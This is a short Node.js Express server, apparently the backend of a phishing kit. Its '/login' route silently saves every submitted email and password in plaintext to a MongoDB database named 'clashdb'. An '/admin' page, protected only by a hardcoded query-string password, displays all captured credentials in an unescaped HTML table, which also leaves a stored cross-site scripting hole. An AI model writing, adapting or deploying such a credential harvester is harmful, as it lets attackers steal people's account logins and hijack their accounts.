const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ---- MongoDB ----
mongoose.connect('mongodb+srv://<USERNAME>:<PASSWORD>@<CLUSTER>.mongodb.net/clashdb', {
    useNewUrlParser: true,
    useUnifiedTopology: true
});

// ---- Schema ----
const User = mongoose.model('User', new mongoose.Schema({
    email: String,
    password: String,
    date: { type: Date, default: Date.now }
}));

// ---- Save user ----
app.post('/login', async (req, res) => {
    await User.create({ email: req.body.email, password: req.body.password });
    res.json({ success: true });
});

// ---- Admin ----
const ADMIN_PASS = "1234"; // Change this
app.get('/admin', async (req, res) => {
    if (req.query.pass !== ADMIN_PASS) return res.send("<h2>Access Denied</h2>");
    const users = await User.find().sort({ date: -1 });
    let rows = users.map(u => `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.date.toLocaleString()}</td></tr>`).join('');
    res.send(`<h1>Admin Panel</h1><table border="1" cellpadding="8"><tr><th>Email</th><th>Password</th><th>Date</th></tr>${rows}</table>`);
});

// ---- Start ----
app.listen(3000, () => console.log("Server running on 3000"));
